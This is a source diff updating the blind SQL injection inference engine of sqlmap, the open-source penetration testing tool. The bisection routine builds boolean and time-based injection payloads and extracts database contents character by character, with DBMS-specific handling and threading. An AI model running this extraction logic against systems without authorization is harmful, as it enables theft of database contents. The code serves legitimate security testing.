@@ -1,29 +1,32 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
+from __future__ import division
+
 import re
-import threading
 import time
 
-from extra.safe2bin.safe2bin import safecharencode
 from lib.core.agent import agent
 from lib.core.common import Backend
 from lib.core.common import calculateDeltaSeconds
 from lib.core.common import dataToStdout
-from lib.core.common import decodeHexValue
+from lib.core.common import decodeDbmsHexValue
 from lib.core.common import decodeIntToUnicode
 from lib.core.common import filterControlChars
 from lib.core.common import getCharset
 from lib.core.common import getCounter
-from lib.core.common import goGoodSamaritan
 from lib.core.common import getPartRun
+from lib.core.common import getTechnique
+from lib.core.common import getTechniqueData
+from lib.core.common import goGoodSamaritan
 from lib.core.common import hashDBRetrieve
 from lib.core.common import hashDBWrite
 from lib.core.common import incrementCounter
+from lib.core.common import isListLike
 from lib.core.common import safeStringFormat
 from lib.core.common import singleTimeWarnMessage
 from lib.core.data import conf
@@ -35,13 +38,14 @@ from lib.core.enums import CHARSET_TYPE
 from lib.core.enums import DBMS
 from lib.core.enums import PAYLOAD
 from lib.core.exception import SqlmapThreadException
+from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.core.settings import CHAR_INFERENCE_MARK
 from lib.core.settings import INFERENCE_BLANK_BREAK
-from lib.core.settings import INFERENCE_UNKNOWN_CHAR
-from lib.core.settings import INFERENCE_GREATER_CHAR
 from lib.core.settings import INFERENCE_EQUALS_CHAR
+from lib.core.settings import INFERENCE_GREATER_CHAR
 from lib.core.settings import INFERENCE_MARKER
 from lib.core.settings import INFERENCE_NOT_EQUALS_CHAR
+from lib.core.settings import INFERENCE_UNKNOWN_CHAR
 from lib.core.settings import MAX_BISECTION_LENGTH
 from lib.core.settings import MAX_REVALIDATION_STEPS
 from lib.core.settings import NULL
@@ -55,6 +59,7 @@ from lib.core.threads import runThreads
 from lib.core.unescaper import unescaper
 from lib.request.connect import Connect as Request
 from lib.utils.progress import ProgressBar
+from lib.utils.safe2bin import safecharencode
 from lib.utils.xrange import xrange
 
 def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
@@ -69,17 +74,22 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
     finalValue = None
     retrievedLength = 0
 
+    if payload is None:
+        return 0, None
+
     if charsetType is None and conf.charset:
         asciiTbl = sorted(set(ord(_) for _ in conf.charset))
     else:
         asciiTbl = getCharset(charsetType)
 
     threadData = getCurrentThreadData()
-    timeBasedCompare = (kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
+    timeBasedCompare = (getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
     retVal = hashDBRetrieve(expression, checkConf=True)
 
     if retVal:
-        if PARTIAL_HEX_VALUE_MARKER in retVal:
+        if conf.repair and INFERENCE_UNKNOWN_CHAR in retVal:
+            pass
+        elif PARTIAL_HEX_VALUE_MARKER in retVal:
             retVal = retVal.replace(PARTIAL_HEX_VALUE_MARKER, "")
 
             if retVal and conf.hexConvert:
@@ -99,6 +109,21 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
             return 0, retVal
 
+    if Backend.isDbms(DBMS.MCKOI):
+        match = re.search(r"\ASELECT\b(.+)\bFROM\b(.+)\Z", expression, re.I)
+        if match:
+            original = queries[Backend.getIdentifiedDbms()].inference.query
+            right = original.split('<')[1]
+            payload = payload.replace(right, "(SELECT %s FROM %s)" % (right, match.group(2).strip()))
+            expression = match.group(1).strip()
+
+    elif Backend.isDbms(DBMS.FRONTBASE):
+        match = re.search(r"\ASELECT\b(\s+TOP\s*\([^)]+\)\s+)?(.+)\bFROM\b(.+)\Z", expression, re.I)
+        if match:
+            payload = payload.replace(INFERENCE_GREATER_CHAR, " FROM %s)%s" % (match.group(3).strip(), INFERENCE_GREATER_CHAR))
+            payload = payload.replace("SUBSTRING", "(SELECT%sSUBSTRING" % (match.group(1) if match.group(1) else " "), 1)
+            expression = match.group(2).strip()
+
     try:
         # Set kb.partRun in case "common prediction" feature (a.k.a. "good samaritan") is used or the engine is called from the API
         if conf.predictOutput:
@@ -110,22 +135,22 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
         if partialValue:
             firstChar = len(partialValue)
-        elif re.search(r"(?i)\b(LENGTH|LEN)\(", expression):
+        elif re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
             firstChar = 0
-        elif (kb.fileReadMode or dump) and conf.firstChar is not None and (isinstance(conf.firstChar, int) or (isinstance(conf.firstChar, basestring) and conf.firstChar.isdigit())):
+        elif conf.firstChar is not None and (isinstance(conf.firstChar, int) or (hasattr(conf.firstChar, "isdigit") and conf.firstChar.isdigit())):
             firstChar = int(conf.firstChar) - 1
             if kb.fileReadMode:
                 firstChar <<= 1
-        elif isinstance(firstChar, basestring) and firstChar.isdigit() or isinstance(firstChar, int):
+        elif hasattr(firstChar, "isdigit") and firstChar.isdigit() or isinstance(firstChar, int):
             firstChar = int(firstChar) - 1
         else:
             firstChar = 0
 
-        if re.search(r"(?i)\b(LENGTH|LEN)\(", expression):
+        if re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
             lastChar = 0
-        elif dump and conf.lastChar is not None and (isinstance(conf.lastChar, int) or (isinstance(conf.lastChar, basestring) and conf.lastChar.isdigit())):
+        elif conf.lastChar is not None and (isinstance(conf.lastChar, int) or (hasattr(conf.lastChar, "isdigit") and conf.lastChar.isdigit())):
             lastChar = int(conf.lastChar)
-        elif isinstance(lastChar, basestring) and lastChar.isdigit() or isinstance(lastChar, int):
+        elif hasattr(lastChar, "isdigit") and lastChar.isdigit() or isinstance(lastChar, int):
             lastChar = int(lastChar)
         else:
             lastChar = 0
@@ -138,7 +163,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
         else:
             expressionUnescaped = unescaper.escape(expression)
 
-        if isinstance(length, basestring) and length.isdigit() or isinstance(length, int):
+        if hasattr(length, "isdigit") and length.isdigit() or isinstance(length, int):
             length = int(length)
         else:
             length = None
@@ -153,56 +178,56 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
             length = None
 
         showEta = conf.eta and isinstance(length, int)
-        numThreads = min(conf.threads, length) or 1
+
+        if kb.bruteMode:
+            numThreads = 1
+        else:
+            numThreads = min(conf.threads or 0, length or 0) or 1
 
         if showEta:
             progress = ProgressBar(maxValue=length)
 
-        if timeBasedCompare and conf.threads > 1 and not conf.forceThreads:
-            warnMsg = "multi-threading is considered unsafe in time-based data retrieval. Going to switch it off automatically"
-            singleTimeWarnMessage(warnMsg)
-
         if numThreads > 1:
-            if not timeBasedCompare or conf.forceThreads:
+            if not timeBasedCompare or kb.forceThreads:
                 debugMsg = "starting %d thread%s" % (numThreads, ("s" if numThreads > 1 else ""))
                 logger.debug(debugMsg)
             else:
                 numThreads = 1
 
-        if conf.threads == 1 and not timeBasedCompare and not conf.predictOutput:
+        if conf.threads == 1 and not any((timeBasedCompare, conf.predictOutput)):
             warnMsg = "running in a single-thread mode. Please consider "
             warnMsg += "usage of option '--threads' for faster data retrieval"
             singleTimeWarnMessage(warnMsg)
 
-        if conf.verbose in (1, 2) and not showEta and not conf.api:
-            if isinstance(length, int) and conf.threads > 1:
+        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
+            if isinstance(length, int) and numThreads > 1:
                 dataToStdout("[%s] [INFO] retrieved: %s" % (time.strftime("%X"), "_" * min(length, conf.progressWidth)))
                 dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
             else:
                 dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
 
-        hintlock = threading.Lock()
-
         def tryHint(idx):
-            with hintlock:
+            with kb.locks.hint:
                 hintValue = kb.hintValue
 
-            if hintValue is not None and len(hintValue) >= idx:
-                if Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.MAXDB, DBMS.DB2):
+            if payload is not None and len(hintValue or "") > 0 and len(hintValue) >= idx:
+                if "'%s'" % CHAR_INFERENCE_MARK in payload:
                     posValue = hintValue[idx - 1]
                 else:
                     posValue = ord(hintValue[idx - 1])
 
-                forgedPayload = agent.extractPayload(payload)
-                forgedPayload = safeStringFormat(forgedPayload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue))
+                markingValue = "'%s'" % CHAR_INFERENCE_MARK
+                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
+                forgedPayload = agent.extractPayload(payload) or ""
+                forgedPayload = safeStringFormat(forgedPayload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue)).replace(markingValue, unescapedCharValue)
                 result = Request.queryPage(agent.replacePayload(payload, forgedPayload), timeBasedCompare=timeBasedCompare, raise404=False)
-                incrementCounter(kb.technique)
+                incrementCounter(getTechnique())
 
                 if result:
                     return hintValue[idx - 1]
 
-            with hintlock:
-                kb.hintValue = None
+            with kb.locks.hint:
+                kb.hintValue = ""
 
             return None
 
@@ -223,13 +248,13 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
             result = not Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
 
-            if result and timeBasedCompare:
-                result = threadData.lastCode == kb.injection.data[kb.technique].trueCode
+            if result and timeBasedCompare and getTechniqueData().trueCode:
+                result = threadData.lastCode == getTechniqueData().trueCode
                 if not result:
-                    warnMsg = "detected HTTP code '%s' in validation phase is differing from expected '%s'" % (threadData.lastCode, kb.injection.data[kb.technique].trueCode)
+                    warnMsg = "detected HTTP code '%s' in validation phase is differing from expected '%s'" % (threadData.lastCode, getTechniqueData().trueCode)
                     singleTimeWarnMessage(warnMsg)
 
-            incrementCounter(kb.technique)
+            incrementCounter(getTechnique())
 
             return result
 
@@ -264,7 +289,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
             elif len(charTbl) == 1:
                 forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))
                 result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
-                incrementCounter(kb.technique)
+                incrementCounter(getTechnique())
 
                 if result:
                     return decodeIntToUnicode(charTbl[0])
@@ -272,7 +297,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                     return None
 
             maxChar = maxValue = charTbl[-1]
-            minChar = minValue = charTbl[0]
+            minValue = charTbl[0]
             firstCheck = False
             lastCheck = False
             unexpectedCode = False
@@ -288,12 +313,13 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                                     lastChar = [_ for _ in threadData.shared.value if _ is not None][-1]
                                 except IndexError:
                                     lastChar = None
-                                if 'a' <= lastChar <= 'z':
-                                    position = charTbl.index(ord('a') - 1)  # 96
-                                elif 'A' <= lastChar <= 'Z':
-                                    position = charTbl.index(ord('A') - 1)  # 64
-                                elif '0' <= lastChar <= '9':
-                                    position = charTbl.index(ord('0') - 1)  # 47
+                                else:
+                                    if 'a' <= lastChar <= 'z':
+                                        position = charTbl.index(ord('a') - 1)  # 96
+                                    elif 'A' <= lastChar <= 'Z':
+                                        position = charTbl.index(ord('A') - 1)  # 64
+                                    elif '0' <= lastChar <= '9':
+                                        position = charTbl.index(ord('0') - 1)  # 47
                             except ValueError:
                                 pass
                             finally:
@@ -332,12 +358,18 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                             kb.responseTimePayload = None
 
                     result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
-                    incrementCounter(kb.technique)
+                    incrementCounter(getTechnique())
 
-                    if not timeBasedCompare:
-                        unexpectedCode |= threadData.lastCode not in (kb.injection.data[kb.technique].falseCode, kb.injection.data[kb.technique].trueCode)
+                    if not timeBasedCompare and getTechniqueData() is not None:
+                        unexpectedCode |= threadData.lastCode not in (getTechniqueData().falseCode, getTechniqueData().trueCode)
                         if unexpectedCode:
-                            warnMsg = "unexpected HTTP code '%s' detected. Will use (extra) validation step in similar cases" % threadData.lastCode
+                            if threadData.lastCode is not None:
+                                warnMsg = "unexpected HTTP code '%s' detected." % threadData.lastCode
+                            else:
+                                warnMsg = "unexpected response detected."
+
+                            warnMsg += " Will use (extra) validation step in similar cases"
+
                             singleTimeWarnMessage(warnMsg)
 
                     if result:
@@ -371,7 +403,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                                 charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())
                                 originalTbl = xrange(charTbl)
                                 maxChar = maxValue = charTbl[-1]
-                                minChar = minValue = charTbl[0]
+                                minValue = charTbl[0]
                             else:
                                 return None
                         else:
@@ -383,7 +415,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                                         kb.originalTimeDelay = conf.timeSec
 
                                     threadData.validationRun = 0
-                                    if retried < MAX_REVALIDATION_STEPS:
+                                    if (retried or 0) < MAX_REVALIDATION_STEPS:
                                         errMsg = "invalid character detected. retrying.."
                                         logger.error(errMsg)
 
@@ -416,6 +448,10 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                             else:
                                 return None
             else:
+                if "'%s'" % CHAR_INFERENCE_MARK in payload and conf.charset:
+                    errMsg = "option '--charset' is not supported on '%s'" % Backend.getIdentifiedDbms()
+                    raise SqlmapUnsupportedFeatureException(errMsg)
+
                 candidates = list(originalTbl)
                 bit = 0
                 while len(candidates) > 1:
@@ -433,7 +469,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
                     forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, "&%d%s" % (mask, INFERENCE_GREATER_CHAR)), (expressionUnescaped, idx, 0))
                     result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
-                    incrementCounter(kb.technique)
+                    incrementCounter(getTechnique())
 
                     if result:
                         candidates = [_ for _ in candidates if _ & mask > 0]
@@ -445,13 +481,13 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                 if candidates:
                     forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, candidates[0]))
                     result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
-                    incrementCounter(kb.technique)
+                    incrementCounter(getTechnique())
 
                     if result:
                         return decodeIntToUnicode(candidates[0])
 
         # Go multi-threading (--threads > 1)
-        if conf.threads > 1 and isinstance(length, int) and length > 1:
+        if numThreads > 1 and isinstance(length, int) and length > 1:
             threadData.shared.value = [None] * length
             threadData.shared.index = [firstChar]    # As list for python nested function scoping
             threadData.shared.start = firstChar
@@ -469,11 +505,14 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                             currentCharIndex = threadData.shared.index[0]
 
                         if kb.threadContinue:
-                            start = time.time()
                             val = getChar(currentCharIndex, asciiTbl, not(charsetType is None and conf.charset))
                             if val is None:
                                 val = INFERENCE_UNKNOWN_CHAR
                         else:
+                            break
+
+                        # NOTE: https://github.com/sqlmapproject/sqlmap/issues/4629
+                        if not isListLike(threadData.shared.value):
                             break
 
                         with kb.locks.value:
@@ -482,7 +521,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
                         if kb.threadContinue:
                             if showEta:
-                                progress.progress(calculateDeltaSeconds(start), threadData.shared.index[0])
+                                progress.progress(threadData.shared.index[0])
                             elif conf.verbose >= 1:
                                 startCharIndex = 0
                                 endCharIndex = 0
@@ -499,7 +538,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                                 count = threadData.shared.start
 
                                 for i in xrange(startCharIndex, endCharIndex + 1):
-                                    output += '_' if currentValue[i] is None else currentValue[i]
+                                    output += '_' if currentValue[i] is None else filterControlChars(currentValue[i] if len(currentValue[i]) == 1 else ' ', replacement=' ')
 
                                 for i in xrange(length):
                                     count += 1 if currentValue[i] is not None else 0
@@ -510,13 +549,13 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                                 if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length - 1):
                                     output = output[:-2] + ".."
 
-                                if conf.verbose in (1, 2) and not showEta and not conf.api:
+                                if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
                                     _ = count - firstChar
                                     output += '_' * (min(length, conf.progressWidth) - len(output))
                                     status = ' %d/%d (%d%%)' % (_, length, int(100.0 * _ / length))
                                     output += status if _ != length else " " * len(status)
 
-                                    dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), filterControlChars(output)))
+                                    dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), output))
 
                 runThreads(numThreads, blindThread, startThreadMsg=False)
 
@@ -540,7 +579,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                 finalValue = "".join(value)
                 infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), filterControlChars(finalValue))
 
-            if conf.verbose in (1, 2) and not showEta and infoMsg and not conf.api:
+            if conf.verbose in (1, 2) and infoMsg and not any((showEta, conf.api, kb.bruteMode)):
                 dataToStdout(infoMsg)
 
         # No multi-threading (--threads = 1)
@@ -550,7 +589,6 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
             while True:
                 index += 1
-                start = time.time()
 
                 # Common prediction feature (a.k.a. "good samaritan")
                 # NOTE: to be used only when multi-threading is not set for
@@ -565,17 +603,17 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                         # One-shot query containing equals commonValue
                         testValue = unescaper.escape("'%s'" % commonValue) if "'" not in commonValue else unescaper.escape("%s" % commonValue, quote=False)
 
-                        query = kb.injection.data[kb.technique].vector
+                        query = getTechniqueData().vector
                         query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)%s%s" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, testValue)))
                         query = agent.suffixQuery(query)
 
                         result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
-                        incrementCounter(kb.technique)
+                        incrementCounter(getTechnique())
 
                         # Did we have luck?
                         if result:
                             if showEta:
-                                progress.progress(calculateDeltaSeconds(start), len(commonValue))
+                                progress.progress(len(commonValue))
                             elif conf.verbose in (1, 2) or conf.api:
                                 dataToStdout(filterControlChars(commonValue[index - 1:]))
 
@@ -589,12 +627,12 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                         subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))
                         testValue = unescaper.escape("'%s'" % commonPattern) if "'" not in commonPattern else unescaper.escape("%s" % commonPattern, quote=False)
 
-                        query = kb.injection.data[kb.technique].vector
+                        query = getTechniqueData().vector
                         query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)=%s" % (subquery, testValue)))
                         query = agent.suffixQuery(query)
 
                         result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
-                        incrementCounter(kb.technique)
+                        incrementCounter(getTechnique())
 
                         # Did we have luck?
                         if result:
@@ -611,7 +649,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                     # If we had no luck with commonValue and common charset,
                     # use the returned other charset
                     if not val:
-                        val = getChar(index, otherCharset, otherCharset==asciiTbl)
+                        val = getChar(index, otherCharset, otherCharset == asciiTbl)
                 else:
                     val = getChar(index, asciiTbl, not(charsetType is None and conf.charset))
 
@@ -625,13 +663,16 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                 threadData.shared.value = partialValue = partialValue + val
 
                 if showEta:
-                    progress.progress(time.time() - charStart, index)
-                elif conf.verbose in (1, 2) or conf.api:
+                    progress.progress(index)
+                elif (conf.verbose in (1, 2) and not kb.bruteMode) or conf.api:
                     dataToStdout(filterControlChars(val))
 
-                # some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces
-                if len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace() and partialValue.strip(' ')[-1:] != '\n':
+                # Note: some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces
+                if Backend.getIdentifiedDbms() in (DBMS.FIREBIRD, DBMS.DB2, DBMS.MAXDB, DBMS.DERBY, DBMS.FRONTBASE) and len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace():
                     finalValue = partialValue[:-INFERENCE_BLANK_BREAK]
+                    break
+                elif charsetType and partialValue[-1:].isspace():
+                    finalValue = partialValue[:-1]
                     break
 
                 if (lastChar > 0 and index >= lastChar):
@@ -644,20 +685,19 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
         abortedFlag = True
     finally:
         kb.prependFlag = False
-        kb.stickyLevel = None
         retrievedLength = len(finalValue or "")
 
         if finalValue is not None:
-            finalValue = decodeHexValue(finalValue) if conf.hexConvert else finalValue
+            finalValue = decodeDbmsHexValue(finalValue) if conf.hexConvert else finalValue
             hashDBWrite(expression, finalValue)
         elif partialValue:
             hashDBWrite(expression, "%s%s" % (PARTIAL_VALUE_MARKER if not conf.hexConvert else PARTIAL_HEX_VALUE_MARKER, partialValue))
 
-    if conf.hexConvert and not abortedFlag and not conf.api:
+    if conf.hexConvert and not any((abortedFlag, conf.api, kb.bruteMode)):
         infoMsg = "\r[%s] [INFO] retrieved: %s  %s\n" % (time.strftime("%X"), filterControlChars(finalValue), " " * retrievedLength)
         dataToStdout(infoMsg)
     else:
-        if conf.verbose in (1, 2) and not showEta and not conf.api:
+        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
             dataToStdout("\n")
 
         if (conf.verbose in (1, 2) and showEta) or conf.verbose >= 3:
@@ -672,7 +712,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
     _ = finalValue or partialValue
 
-    return getCounter(kb.technique), safecharencode(_) if kb.safeCharEncode else _
+    return getCounter(getTechnique()), safecharencode(_) if kb.safeCharEncode else _
 
 def queryOutputLength(expression, payload):
     """
@@ -687,7 +727,7 @@ def queryOutputLength(expression, payload):
     lengthExprUnescaped = agent.forgeQueryOutputLength(expression)
     count, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)
 
-    debugMsg = "performed %d queries in %.2f seconds" % (count, calculateDeltaSeconds(start))
+    debugMsg = "performed %d quer%s in %.2f seconds" % (count, 'y' if count == 1 else "ies", calculateDeltaSeconds(start))
     logger.debug(debugMsg)
 
     if length == " ":
